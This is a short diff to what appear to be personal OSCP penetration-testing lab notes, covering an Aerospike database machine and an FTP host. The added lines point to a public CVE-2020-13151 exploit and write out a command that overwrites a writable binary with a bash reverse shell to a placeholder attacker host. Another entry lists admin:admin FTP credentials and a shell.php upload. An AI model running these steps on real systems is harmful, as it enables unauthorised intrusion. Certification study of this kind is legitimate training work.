@@ -1,4 +1,8 @@
 
+#### OSCP A, Aero => Aerospike db 
+1. Scan port 3003, exploit = https://github.com/b4ny4n/CVE-2020-13151 
+2. Use pspy + find writable files = `echo "/bin/bash -c 'bash -i >& /dev/tcp/{{LHOST}}/443 0>&1'" > /opt/aerospike/bin/asadm` 
+
 #### AuthBy => FTP default creds 
 1. Also try admin:admin on FTP! Upload shell.php 
 
